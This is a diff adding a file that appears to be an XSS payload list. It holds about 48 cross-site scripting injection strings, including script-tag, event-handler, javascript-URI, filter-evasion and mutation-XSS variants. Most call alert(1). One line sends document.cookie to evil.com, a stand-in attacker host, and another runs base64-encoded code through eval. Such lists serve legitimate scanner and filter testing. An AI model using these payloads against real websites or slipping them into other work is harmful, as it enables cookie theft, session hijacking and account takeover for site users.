@@ -1,0 +1,48 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+javascript:alert(1)
+javascript:alert(document.cookie)
+data:text/html,<script>alert(1)</script>
+<scr<script>ipt>alert(1)</scr</scr<script>ipt>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>fetch('https://evil.com/?c='+document.cookie)</script>
+"><svg/onload=alert(1)>
+"><body onload=alert(1)>
+"><iframe src="javascript:alert(1)">
+<div onmouseover=alert(1)>hover me</div>
+<button onclick=alert(1)>click</button>
+<input onmouseover=alert(1)>
+"><input onfocus=alert(1) autofocus>
+"><marquee onstart=alert(1)>
+"><details open ontoggle=alert(1)>
+"><video src=x onerror=alert(1)>
+"><audio src=x onerror=alert(1)>
+"><object data="javascript:alert(1)">
+"><embed src="javascript:alert(1)">
+"><base href="javascript://"><a href=alert(1)>click</a>
+"><form><button formaction="javascript:alert(1)">X</button>
+"><math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
+"><style><img src=x onerror=alert(1)>
+"><template><script>alert(1)</script></template>
+"></script><script>alert(1)</script>
+"><img ""><script>alert(1)</script>
+"></><script>alert(1)</script>
+"><a href="data:text/html,<script>alert(1)</script>">X</a>
+"><svg><animate onbegin=alert(1) attributeName=x dur=1s>
+"><svg><set onbegin=alert(1) attributeName=x to=1>
